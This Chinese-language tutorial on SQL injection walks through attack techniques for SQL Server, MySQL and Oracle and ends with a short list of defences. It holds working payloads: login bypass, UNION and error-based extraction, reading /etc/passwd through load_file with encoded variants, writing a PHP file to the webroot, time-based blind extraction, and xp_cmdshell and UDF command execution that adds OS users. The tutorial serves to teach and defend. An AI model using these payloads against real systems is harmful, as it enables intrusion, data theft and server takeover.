# sql注入
所谓SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。

有如下sql查询语句
```sql
Select * from user where username='"+username+"' and password ='"+password+"'
```

如果我设置username='or 1=1--
```sql
Select * from user where username='' or 1=1 --and password =''
```

## 注入漏洞分类
### 数字型注入
```sql
select* from table where Id=1
```
正确的url
URL httpxxxxxxxx.pho?id=8
错误1:出错
httpxxxxxxxx.pho?id=8'
错误2:可正确执行
httpxxxxxxxx.pho?id=8 and 1=1
错误3:可正确执行但是没结果
httpxxxxxxxx.pho?id=8 and 1=2


### 字符型注入
如上面的demo

常见sql注入分类
post注入
cookie注入
数据库延时注入：利用数据库的延时性特征
搜索注入
base64注入:注入字符串经过base64加密


常见的数据库注入

1sqlserver
一、利用错误消息提取信息
1.1 枚举当前表及列
执行select * from users where username='root' and password='root' having 1=1 --'
SQL执行器将抛出一个错误：
消息8120，级别16，状态1，第2行
选择列表中的列“users.id”无效，因为该列没有包含在聚合函数或GROUP BY子句中。
可以发现当前表名为“users”，并且存在“ID”列名，攻击者可以通过此特性继续得到其他列名
select * from users where username='root' and password='root' group by users.id having 1=1 --'
执行器错误提示：
消息8120，级别16，状态1，第1行
选择列表中的列“users.username”无效，因为该列没有包含在聚合函数或GROUP BY子句中。

1.2 利用数据类型错误提取数据
select * from users where username='root' and password='root' and 1 > (select top 1 username from users)
执行器错误提示：
消息245，级别16，状态1，第2行
在将varchar值“root”转换成数据类型int时失败
可以发现root帐户已经被SQL Server给“出卖”了，利用此方法可以递归推导出所有的帐户信息。

二、获取元数据
SQL Server提供了大量试图，便于取得元数据。
取得当前数据库表：
SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES
取得Student表字段：
SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS where TABLE_NAME='Student'
还有其他一些常用的系统数据库试图：sys.databases ; sys.sql_logins ; sys.all_columns ; sys.database_principals ; sys.database_files ; sysobjects

三、Order by子句
select id,username,password from users where id=1 :SQL执行正常
select id,username,password from users where id=1 Order by 1 :按照第一列排序，SQL执行正常。
select id,username,password from users where id=1 Order by 2 :按照第二列排序，SQL执行正常。
select id,username,password from users where id=1 Order by 3 :按照第三列排序，SQL执行正常。
select id,username,password from users where id=1 Order by 4 :抛出如下异常。
消息108，级别16，状态1，第1行
ORDER BY位置号4超出了选择列表中项数的范围。
得知SQL语句总共有3列。

四、UNION查询
UNION关键字将两个或更多个查询结果组合为单个结果集，俗称联合查询。
有两个基本规则：所有查询中的列数必须相同；数据类型必须兼容。
4.1 联合查询探测字段数
递归查询，知道无错误产生，可得知User表查询的字段数：
union select null,null
union select null,null,null
也有人喜欢使用select 1,2,3语句，不过该语句容易出现类型不兼容的异常。
4.2 联合查询敏感信息
如果得知列数为4，可以使用以下语句继续注入
id=5 union select 'x',null,null,null from sysobject where xtype='U'
递归更换x的位置，直到语句执行正常，代表数据类型兼容，就可以将x换为SQL语句，查询敏感信息。
备注：UNION和UNION ALL最大的区别在于UNION会自动去除重复的数据，并且按照默认规则排序。

五、函数
SQL Server提供了非常多的系统函数，利用该系统函数可以访问SQL Server系统表中的信息，而无须使用SQL语句查询。
例如，select db_name()：返回数据库名称

六、危险的存储过程
存储过程（Stored Procedure）是在大型数据库系统中为了完成特定功能的一组SQL“函数”，如：执行系统命令，查看注册表，读取磁盘目录等。
攻击者最常使用的存储过程是“xp_cmdshell”，这个存储过程允许用户执行操作系统命令。
例如：http://www.secbug.org/test.aspx?id=1存在注入点，那么攻击者就可以实施命令攻击：
http://www.secbug.org/test.aspx?id=1;exec xp_cmdshell 'net user test test /add'
最终执行SQL语句如下：
select * from table where id=1; exec xp_cmdshell 'net user test test /add'
攻击者可以直接利用xp_cmdshell操纵服务器。
注：并不是任何数据库用户都可以使用此类存储过程，用户必须持有 CONTROL SERVER权限。

存储过程仅存在于MSSQL和Oracle中，MySQL中类似的功能是UDF。


七、动态执行
SQL Server支持动态执行语句，用户可以提交一个字符串来执行SQL语句。
exec('select username,password from users')
也可以通过定义十六进制的SQL语句，使用exec函数执行。
declare @query varchar(888)
select @query=0x73656c6563742031
exec(@query)



mysql
1，mysql中的注释

①：#：行注释。

②：--：行注释，不同的是这个注释后要跟一个或多个空格，或者tag。

③：/**/：块注释，也是多行注释。

/**/块注释有一个特点，如下sql语句：

执行结果正常显示，/**/是没有起作用的，因为其！有特殊意义，像图中的/*！55555，username*/则表示如果版本号高于或等于5.55.55，则会被执行。如果！后不加版本号，mysql则会直接执行sql语句。
二、获取元数据
MySQL 5.0及其以上版本提供了INFORMATION_SCHEMA,INFORMATION_SCHEMA是信息数据库，它提供了访问数据库元数据的方式。
（1）查询用户数据库名称
select SCHEMA_NAME from INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1
语句的含义为：从INFORMATION_SCHEMA.SCHEMATA表中查询出第一个数据库名称。
INFORMATION_SCHEMA.SCHEMATA提供了关于数据库的信息。
（2）查询当前数据库表
select TABLE_NAME from INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA=(select DATABASE()) limit 0,1
语句的含义为：从INFORMATION_SCHEMA.TABLES表中查询当前数据库表，并且只显示第一条数据，INFORMATION_SCHEMA.TABLES表给出了关于数据库中表的信息。
（3）查询指定表的所有字段
select COLUMNS_NAME from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME='Student' LIMIT 0,1
语句的含义为：从INFORMATION_SCHEMA.COLUMNS表中查询TABLE_NAME为Student的字段名，并置只显示一条。INFORMATION_SCHEMA.COLUMNS表给出了表中的列信息。

三、UNION查询
MySQL与Oracle并不像SQL Server那样可以执行多语句。所以，在利用查询时，通常配合UNION关键字。

SQL Server与MySQL、Oracle中的UNION关键字的使用基本相同，但也有少许差异。通过下面的语句来验证。

分别在SQL Server、MySQL中执行以下SQL语句：

select id,username,password from users union select 1,2,3
Oracle数据库执行以下SQL语句：
select id,username,password from users union select 1,2,3 from dual
SQL Server和Oracle：语句错误，数据类型不匹配，无法正常执行（列的数据类型在不确定的情况下，最好使用NULL关键字匹配）
MySQL：语句正常执行

在Oracle与SQL Server中，列的数据类型在不确定的情况下，最好使用NULL关键字匹配。


四、MySQL函数利用
（1）load_file（）函数读文件操作
文件必须为全路径名称（绝对路径），而且用户必须持有FILE权限，文件容量也必须小于max_allowed_packet字节。
union select 1,load_file('/etc/passwd'),3,4,5,6 #
union select 1,load_file('0x2F6563742F706173737764'),3,4,5,6 #
union select 1,load_file(char(47,101,99,116,47,112,97,115,115,119,100)),3,4,5,6 #
（2）into outfile写文件操作
文件必须为全路径名称（绝对路径），而且用户必须持有FILE权限。
select '<?php phpinfo();?>' into outfile 'c:\wwwroot\1.php'
select char(99,58,92,50,46,116,120,116) into outfile 'c:\wwwroot\1.php'

into dumpfile和into outfile的区别：dumpfile适用于二进制文件，它会将目标文件写入同一行内；而OUTFILE则更适用于文本文件。

（3）连接字符串
在MySQL查询中，如果需要一次查询多个数据，可以使用concat()或concat_ws()函数来完成。
concat()函数:select name from student where id=1 union select concat(user(),',',database(),',',version());
concat_ws()函数：select name from student where id=1 union select concat_ws(0x2c,user(),database(),version());

五、MySQL显错式注入
（1）通过updatexml函数，执行SQL语句
select * from message where id=1 and updatexml(1,(concat(0x7C,(select @@version))),1);
显示结果如下：
ERROR 1105 (HY000):XPATH syntax error: '|5.1.50-community-log'
（2）通过extractvalue函数，执行SQL语句
select * from message where id=1 and extractvalue(1,concat(0x7C,(select user())));
显示结果如下：
ERROR 1105 (HY000):XPATH syntax error: '|root@localhost'
（3）通过floor函数，执行SQL语句
select * from message where id = 1 union select * from (select count(*),concat(floor(rand(0)*2),(select user()))a from information_schema.tables group by a)b
显示结果如下：
ERROR 1062 (23000):Duplicate entry '1root@localhost' for key 'group_key'
通过此类函数，可以达到与SQL Server数据库显错类似的效果。

六、宽字节注入
是由编码不统一所造成的，这种注入一般出现在PHP+MySQL中
如果在php.ini中打开了magic_quotes_gpc，用户输入0xbf27，经过转义后变成0xbf5c27，但0xbf5c又是一个字符，因此原本会存在的转义符号“\”，在数据库中就被“吃掉”了。单引号又显现了出来。

七、MySQL长字符截断（SQL-Column-Truncation）
在MySQL中的一个设置里有一个sql_mode选项，当sql_mode设置为default时，即没有开启STRICT_ALL_TABLES选项时，MySQL对插入超长的值只会提示warning，而不是error，这样就可能会导致一些截断问题。
新建一张表测试，表结构如下（MySQL 5.1）
CREATE TABLE USERS(
   id int(11) NOT NULL,
   username varchar(7) NOT NULL,
   password varchar(12) NOT NULL
)
分别插入以下SQL语句
（1）插入正常的SQL语句
mysql> insert into users(id,username,password) values (1,'admin','admin');
Query OK,1 row affected (0.00 sec)
（2）插入错误的SQL语句，此时的"admin   "右面有三个空格，长度为8，已经超过了原有的规定长度。
mysql> insert into users(id,username,password) values (2,'admin   ','admin');
Query OK,1 row affected,1 warning (0.00 sec)
（3）插入错误的SQL语句，长度已经超过原有的规定长度。
mysql> insert into users(id,username,password) values (3,'admin   x','admin');
Query OK,1 row affected,1 warning (0.00 sec)
比如，有一处管理员登录是这样判断的，语句如下：$sql="select count(*) from users where username='admin' and password='*****'";
假设管理员登录的用户名为admin，那么攻击者仅需要注册一个“admin   ”用户即可轻易进入后台管理页面。

八、延时注入
当网页页面具有容错功能，就只能通过盲注判断，盲注的意思即页面无差异的注入。延时注入则属于盲注技术的一种，是一种基于时间差异的注入技术。
在MySQL中有一个函数：SLEEP(duration)，这个函数意思是在duration参数给定的秒数后运行语句。
select * from users where id=1 and sleep(3); 3秒后执行SQL语句
可以使用这个函数来判断URL是否存在SQL注入漏洞，步骤如下：
http://www.example.com/user.jsp?id=1 //页面返回正常，1秒左右可打开页面
http://www.example.com/user.jsp?id=1'//页面返回正常，1秒左右可打开页面
http://www.example.com/user.jsp?id=1' and 1=1 //页面返回正常，1秒左右可打开页面
http://www.example.com/user.jsp?id=1 and sleep(3) //页面返回正常，3秒左右可打开页面
DBMS执行了and sleep(3)语句，这样一来可判断出URL确实存在SQL注入漏洞。
与其他函数配合可通过延时注入读取数据
（1）and if(length(user())=0,sleep(3),1)
循环0，如果出现3秒延时，就可以判断出user字符串长度
（2）and if(hex(mid(user(),1,1))=1,sleep(3),1)
取出user字符串的第一个字符，然后与ASCII码循环对比。
（3）and if(hex(mid(user(),L,1))=N,sleep(3),1)
递归破解第二个ACSII码、第三个ASCII码，直至字符串最后一个字符为止。L的位置代表字符串的第几个字符，N的位置代表ASCII码。
SQL Server中的延时函数为waitfor delay、Oracle中的为DBMS_LOCK.SLEEP等函数



九、MySQL中的命令执行
MySQL UDF允许用户以C/C++编码的方式扩展MySQL的功能，并且动态的加载到运行中的MySQL服务器中。其原理是通过dlopen、dlsym、dlclose等接口来实现动态的加载动态函数库的目的。
在流行的数据库中，一般都支持从本地文件系统中导入一个共享库文件作为自定义函数。使用如下语法可以创建UDF：CREATE FUNCTION f_name RETURNS INTEGER SONAME shared_library
MySQL中没有执行外部命令的函数，要调用外部的命令，可以通过开发MySQL UDF来实现。lib_mysqludf_sys就是一个实现了此功能的UDF库。可以利用lib_mysqludf_sys提供的几个函数执行系统命令，其中最主要的函数是sys_eval()和sys_exec()
使用方法：
（1）lib_mysqludf_sys.so复制到mysql/lib/plugin目录下。
（2）在mysql中创建函数(根据需要选取)：Create FUNCTION sys_exec RETURNS int SONAME 'lib_mysqludf_sys.so';
（3）在select语句调用mkdir命令：Select sys_exec('mkdir -p /home/user1/aaa') 
在自动化注入工具SQLMAP中，已经集成了此功能，选项为--os-cmd


一、获取元数据
1.user_tablespaces试图，查看表空间
select tablespace_name from user_tablespaces
2.user_tables试图，查看当前用户的所有表
select table_name from user_tables where rownum = 1
3.user_tab_columns试图，查看当前用户的所有列，例如：查询users表的所有列
select column_name from user_tab_columns where table_name='users'
4.all_users视图，查看oracle数据库的所有用户
select username from all_users
5.user_objects试图，查看当前用户的所有对象（表名称，约束，索引）

select object_name from user_objects


二、UNION查询
1.获取列的总数
Oracle规定，每次查询时后面必须跟表名称，因此有union select null,null,null from dual （dual是Oracle的虚拟表）
Oracle是强类型的数据库，不像MySQL那样可以直接union select 1,2,3，因此一般用null代替
2.获取敏感信息
当前用户权限：select * from session_roles
当前数据库版本：select banner from sys.v_$version where rownum=1
服务器出口IP：用utl_http.request可以实现
服务器监听IP：select utl_inaddr.get_host_address from dual
服务器操作系统：select member from v$logfile where rownum=1
服务器sid：select instance_name from v$instance
当前连接用户：select SYS_CONTEXT ('USERENV','CURRENT_USER') from dual
3.获取数据库表及其内容

在得知表的列数之后，可以通过查询元数据的方式查询表名称、列，然后查询数据，
http://www.example.com/news.jsp?id=1 union select username,password,null from users -- 
在查询数据时同样要注意数据类型，否则无法查询，这只能一一测试 (更换username的位置)：
http://www.example.com/news.jsp?id=1 union select username,null,null from users -- 
在得知列数之后，可以通过暴力猜解的方式来枚举表名称：
http://www.example.com/news.jsp?id=1 union select null,null,null from tableName -- 


三、Oracle中包的概念
Oracle包可以分为两部分，一部分是包的规范，相当于Java中的接口，另一部分是包体，相当于Java里接口的实现类，实现了具体的操作。
在Oracle中，存在许许多多的包，如执行系统命令、备份、I/O操作等
例如，UTL_HTTP，该包提供了对HTTP的一些操作，比如 SELECT UTL_HTTP.REQUEST('http://www.baidu.com') FROM DUAL
执行这条SQL语句，将返回baidu.com的HTML源码。

再如，以Oracle读写文件为例，在Oracle中提供了包UTL_FILE专门用来操作I/O

常用测试工具：
SQLMap,Pangolin,Havij等

SQLMap我看了下是开源的，基于python2.6或者2.7，可以用他来判断url是否可以被sql注入，如果可以，可以通过sqlmap知道数据库的类型，有哪些库
哪些表，哪些字段等等信息
http://sqlmap.org/

 

防止sql注入
1.严格的数据类型，
java。C#等强类型语言可以完全忽略数字型注入，而PHP ASP则呀注意
2.特殊字符转义。
3.使用预编译语言。
java就提供了预编译语言，提供了第三方接口与数据库交互，如statement，callablestatement，preparedstatement等
所以java尽量不要使用冬天拼接的sql会失去他的有效性。
4.框架技术
如hibernate，mybatis等成熟的框架都有较高的安全性
如hibernate：
HQL语言，也最好不要用sql凭借的方式去查询。

5存储过程，
虽然相对安全性较高，但是还是有一定的安全风险。

